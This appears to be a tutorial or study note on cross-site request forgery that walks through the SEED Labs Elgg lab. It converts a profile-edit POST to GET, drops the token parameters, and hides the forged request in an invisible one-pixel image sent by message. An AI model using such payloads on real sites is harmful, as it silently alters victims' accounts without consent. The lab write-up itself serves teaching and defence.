Cross-Site Request Forgery (CSRF) is a security vulnerability in which an attacker tricks a legitimate user into performing an unwanted action on a website without their knowledge or consent.

In a CSRF attack, the attacker tricks the victim into clicking on a malicious link or visiting a malicious web page. This malicious page may contain an HTTP request that performs an unwanted action on the victim's website.

For example, imagine that a user is logged into their online banking account and then visits a malicious web page. The malicious page contains a form that sends an HTTP request to the bank's website to transfer funds from the user's bank account to the attacker's account. If the user clicks the submit button without knowing that they are performing a transfer, the CSRF attack will have been successful.

The CSRF attack can be used to perform a wide variety of unwanted actions, including transferring funds, modifying account information, deleting data and more.

To prevent CSRF attacks, web application developers must implement appropriate security measures, such as including CSRF tokens in HTTP forms and requests. These CSRF tokens allow the web application to verify that the request is coming from a legitimate user and not a malicious attacker (although beware that you can do little things with this too).

# Example

----
> For the example we are going to download the following resource via **wget**: [Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip).
> After the download we will run a **docker-compose up -d** to install the necessary [[Docker]] machines.
> In case we get an error like **networks.net-10.9.0.0.0 value Additional properties are not allowed ('name' was unexpected)** we must edit the file **docker-compose.yml** and delete the line number 41, the one that says name: **net-10.9.0.0**.
----

Before starting with the example, as we are going to be referring to local domains that may coincide with external domains, we are interested in adding them together with their URLs in our **/etc/hosts/** file:

```
10.9.0.5 www.seed-server.com
10.9.0.5 www.example32.com
10.9.0.105 www.attacker32.com
```

The users we will be working with are as follows:

```
alice:seedalice
samy:seedsamy
```

The first thing we are going to do is to log in as *Alice*. If we go to where all the users appear and hovering in each one of them we can see that all of them have an associated id.

Therefore, the first test we are going to do is to change the name of our own user by observing this request with **Burpsuite**.

We see that the request is logically being sent by *POST*, but we are going to try to see if we can send it converting it to *GET* to be able to pass the parameters that we want:

```
GET /action/profile/edit?__elgg_token=waUlam3DKd8Bb9JrU8Bz6A&__elgg_ts=1688139603&name=Test&description=&accesslevel%5bdescription%5d=2&briefdescription=&accesslevel%5bbriefdescription%5d=2&location=&accesslevel%5blocation%5d=2&interests=&accesslevel%5binterests%5d=2&skills=&accesslevel%5bskills%5d=2&contactemail=&accesslevel%5bcontactemail%5d=2&phone=&accesslevel%5bphone%5d=2&mobile=&accesslevel%5bmobile%5d=2&website=&accesslevel%5bwebsite%5d=2&twitter=&accesslevel%5btwitter%5d=2&guid=56 HTTP/1.1
```

We can try removing the apparent unique identifiers before the *name* to see if the request still works:

```
GET /action/profile/edit
name=Test&description=&accesslevel%5bdescription%5d=2&briefdescription=&accesslevel%5bbriefdescription%5d=2&location=&accesslevel%5blocation%5d=2&interests=&accesslevel%5binterests%5d=2&skills=&accesslevel%5bskills%5d=2&contactemail=&accesslevel%5bcontactemail%5d=2&phone=&accesslevel%5bphone%5d=2&mobile=&accesslevel%5bmobile%5d=2&website=&accesslevel%5bwebsite%5d=2&twitter=&accesslevel%5btwitter%5d=2&guid=56 HTTP/1.1
```

We see that it still works and that those identifiers were not really used to validate the authentication by the user. We can try to change the *id* field to see if we can make requests on behalf of another user (with another id) but that will not work.

We are going to drop the petition so that the changes are not applied and we are going to return to *Alice*'s profile.

We see that there is a section to send messages to other users of the platform and we have the option to send it in **HTML** format. Let's try sending a message in **HTML** format to *Samy*:

```html
<h1>Hello my friend</h1>
```

We can see that the message is indeed received in HTML and the tags work.

As we can send GET requests, we can create a small image imperceptible by the user that includes the request that we want the other user to execute, in this case we are going to send the request to change his user name:

```html
<!--  We use the 'alt' tag to put a text on top and set the height and width of the image to 1 to make it unnoticeable -->
<img src="http://www.seed-server.com/action/profile/edit?name=Test&description=&accesslevel%5bdescription%5d=2&briefdescription=&accesslevel%5bbriefdescription%5d=2&location=&accesslevel%5blocation%5d=2&interests=&accesslevel%5binterests%5d=2&skills=&accesslevel%5bskills%5d=2&contactemail=&accesslevel%5bcontactemail%5d=2&phone=&accesslevel%5bphone%5d=2&mobile=&accesslevel%5bmobile%5d=2&website=&accesslevel%5bwebsite%5d=2&twitter=&accesslevel%5btwitter%5d=2&guid=59" alt="IMPORTANT" width="1" height="1"/>
```

When Samy opens the message he will see a message "IMPORTANT" but on the back he will be changing his user name.

We can do this with any input on the web that supports **HTML** code and processes its requests through **GET**.